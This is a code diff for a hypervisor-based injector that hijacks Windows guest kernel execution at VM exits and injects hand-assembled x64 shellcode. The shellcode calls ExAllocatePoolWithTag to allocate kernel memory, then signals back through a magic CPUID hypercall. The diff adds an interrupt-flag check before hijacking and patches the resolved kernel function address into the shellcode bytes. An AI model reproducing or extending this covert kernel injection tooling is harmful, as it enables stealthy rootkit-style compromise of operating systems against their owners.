@@ -6,7 +6,6 @@
 #include "../logs/logs.h"
 #include "../memory_manager/memory_manager.h"
 
-
 namespace injection {
 
 uint8_t Injector::scan_done = 0;
@@ -61,14 +60,23 @@ void Injector::try_inject(trap_frame_t *trap_frame, uint64_t vmexit_count,
   // Windows Kernel Space usually starts at 0xFFFF8... or 0xFFFFF...
   const bool is_kernel_rip = (current_rip >= 0xFFFFF80000000000);
 
-  if (cpl != 0 || !is_kernel_rip) {
-    // [Debug] Skip User Mode / Invalid Context
+  const uint64_t rflags = arch::get_guest_rflags();
+  // Check if Interrupts are Enabled (IF=1).
+  // Calling ExAllocatePool from IF=0 context (High IRQL/ISR) is unsafe and
+  // leads to HANGS.
+  const bool interrupts_enabled = (rflags & 0x200) != 0;
+
+  if (cpl != 0 || !is_kernel_rip || !interrupts_enabled) {
+    // [Debug] Skip User Mode / Invalid Context / High IRQL (IF=0)
     // Backoff: Wait for 50 more exits before retrying
     next_injection_attempt = vmexit_count + 50;
 
-    logs::print("[Runtime] Skipping Hijack Candidate: RIP=0x%p CPL=%d "
-                "(Retrying in 50 exits)\n",
-                current_rip, cpl);
+    // Only log if context is Kernel (to reduce spam from User Mode exits)
+    if (cpl == 0) {
+      logs::print("[Runtime] Skipping Hijack Candidate: RIP=0x%p CPL=%d IF=%d "
+                  "(Retrying in 50 exits)\n",
+                  current_rip, cpl, interrupts_enabled);
+    }
     return;
   }
 
@@ -82,7 +90,7 @@ void Injector::try_inject(trap_frame_t *trap_frame, uint64_t vmexit_count,
       loader::get_kernel_export(ntoskrnl_base, "ExAllocatePoolWithTag");
 
   if (ex_alloc) {
-    inject_minimal_shellcode(trap_frame, ex_alloc);
+    inject_pool_shellcode(trap_frame, ex_alloc);
   } else {
     logs::print("[Runtime] Failed to resolve ExAllocatePoolWithTag.\n");
     // Mark done to avoid spamming resolve failure
@@ -90,19 +98,39 @@ void Injector::try_inject(trap_frame_t *trap_frame, uint64_t vmexit_count,
   }
 }
 
-void Injector::inject_minimal_shellcode(trap_frame_t *trap_frame,
-                                        uint64_t ex_allocate_pool) {
-  // 2. Generate Shellcode [TEST: MINIMAL DIAGNOSTIC]
-  // User Request: Force Enable Interrupts (STI) + Minimal Payload (Verified
-  // BSOD Fix)
+void Injector::inject_pool_shellcode(trap_frame_t *trap_frame,
+                                     uint64_t ex_allocate_pool) {
+  // 2. Generate Shellcode [TEST: EX_ALLOCATE_POOL]
+  // User Request: Force Enable Interrupts (STI) + Pool Allocation
+  // Stack Alignment and Shadow Space are CRITICAL for x64 ABI
+  // Increased Shadow Space to 0x80 (128 bytes) and use CLD to prevent crashes
+
+  logs::print("[Runtime] Injecting Pool Shellcode. Function: 0x%p\n",
+              ex_allocate_pool);
+
   uint8_t code[] = {
       0xFB,                                     // sti (Force Enable Interrupts)
+      0xFC,                                     // cld (Clear Protocol)
+      0x48, 0x83, 0xE4, 0xF0,                   // and rsp, -16 (Align RSP)
+      0x48, 0x81, 0xEC, 0x80, 0x00, 0x00, 0x00, // sub rsp, 0x80 (128 bytes) [7
+                                                // bytes]
+      0x48, 0x31, 0xC9,                         // xor rcx, rcx (NonPagedPool=0)
+      0x48, 0xC7, 0xC2, 0x00, 0x10, 0x00, 0x00, // mov rdx, 0x1000 (Size)
+      0x49, 0xC7, 0xC0, 0x6D, 0x65, 0x6D, 0x65, // mov r8, 'meme' (Tag)
+      0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00,                                     // mov rax, ADDR (Placeholder)
+      0xFF, 0xD0,                               // call rax
+      0x48, 0x89, 0xC2,                         // mov rdx, rax (Save Result)
       0x48, 0xC7, 0xC0, 0x00, 0x50, 0x00, 0x00, // mov rax, 0x5000
-      0x48, 0xB9, 0x37, 0x13, 0x37, 0x13, 0x37,
-      0x13, 0x37, 0x13, // mov rcx, MAGIC
-      0x31, 0xD2,       // xor rdx, rdx
-      0x0F, 0xA2        // cpuid
+      0x48, 0xB9, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,
+      0x13,      // mov rcx, MAGIC
+      0x0F, 0xA2 // cpuid
   };
+
+  // Patch ExAllocatePoolWithTag address
+  // Offset Calculation: 1(STI)+1(CLD)+4(AND)+7(SUB)+3(XOR)+7(MOV RDX)+7(MOV
+  // R8)+2(MOV RAX) = 32
+  *reinterpret_cast<uint64_t *>(&code[32]) = ex_allocate_pool;
 
   // Critical: Use sizeof to avoid truncation
   uint32_t code_size = sizeof(code);
